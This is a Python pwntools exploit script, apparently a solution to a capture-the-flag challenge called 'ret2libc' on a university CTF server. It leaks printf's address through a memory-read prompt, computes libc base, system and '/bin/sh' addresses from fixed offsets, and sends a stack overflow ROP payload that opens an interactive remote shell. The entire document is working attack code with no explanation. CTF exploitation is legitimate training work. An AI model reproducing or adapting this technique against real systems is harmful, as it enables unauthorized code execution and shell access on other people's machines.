from pwn import *
context(arch="amd64", os="linux")
context.terminal = ['bash']

poprdi_addr = 0x400873
printf_got = '6295592'
printf_off = 0x557b0
system_off = 0x45380
binsh_off = 0x18c58b
ret_addr = 0x4005b1 # not necessary

host, port = "ctf.adl.csie.ncu.edu.tw", 11006
#p = process('./ret2libc')
#gdb.attach(p)
p = remote(host, port)

p.recvuntil('Where do you want to see in the memory? Give me the address in decimal:')
p.sendline(printf_got)
line = p.recvline()
line = line[len("The value in memory at 0x601028 is "):-2]
printf_addr = int(line, 16)
print('printf addr = ' + hex(printf_addr))

p.recvuntil('Bypass the check, and ret2libcccccccccccc')
libc_base = printf_addr - printf_off
system_addr = libc_base + system_off
binsh_addr = libc_base + binsh_off
payload = '\x00' + 'a'*0x18 + p64(poprdi_addr) + p64(binsh_addr) + p64(system_addr) + p64(ret_addr)
p.sendline(payload)
p.recvline()
#print p.recvuntil('It could not > 6. If you want the flag, Over my dead body!!!!!')
p.interactive()
